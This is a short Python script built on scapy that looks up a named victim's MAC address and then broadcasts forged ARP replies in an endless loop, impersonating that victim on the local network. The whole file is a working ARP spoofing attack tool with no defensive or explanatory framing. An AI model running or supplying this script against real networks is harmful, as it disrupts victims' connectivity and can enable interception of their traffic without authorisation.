from scapy.all import *
import typer
from rich.console import Console
console = Console()


BROADCAST = "FF:FF:FF:FF:FF:FF"

def getMAC(ip: str):
    mac, _ = srp(Ether(dst=BROADCAST)/ARP(pdst=ip), timeout=2, verbose=0)
    if mac:
        return mac[0][1].src
    return None


def main(victim_ip: str):
    victim_mac = getMAC(victim_ip)
    if not victim_mac:
        console.print(f"[red]Could not find MAC address for {victim_ip}[/red]")
        raise typer.Exit()

    pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, psrc=victim_ip)
    with console.status("Sending Packets..."):
        sendp(pkt, loop=1, inter=0.5)


if __name__ == "__main__":
    typer.run(main)
